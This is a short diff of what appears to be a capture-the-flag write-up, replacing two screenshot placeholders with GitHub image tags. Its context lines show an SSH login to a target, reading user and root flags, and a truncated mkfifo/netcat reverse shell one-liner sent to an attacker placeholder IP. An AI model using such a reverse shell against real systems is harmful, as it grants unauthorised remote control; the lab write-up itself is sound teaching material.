@@ -154,7 +154,7 @@ ssh adrian@<TARGET_IP>
 cat user.txt
 ```
 
-[SCREEN01]
+<img width="347" height="81" alt="SCREEN01" src="https://github.com/user-attachments/assets/fabd7240-cf9e-415f-831f-809e68a5b122" />
 
 ---
 
@@ -194,4 +194,4 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 44
 cat root.txt
 ```
 
-[SCREEN02]
+<img width="294" height="179" alt="SCREEN02" src="https://github.com/user-attachments/assets/d3ba1030-2651-4f01-b7a2-b2e8a7ab4a27" />
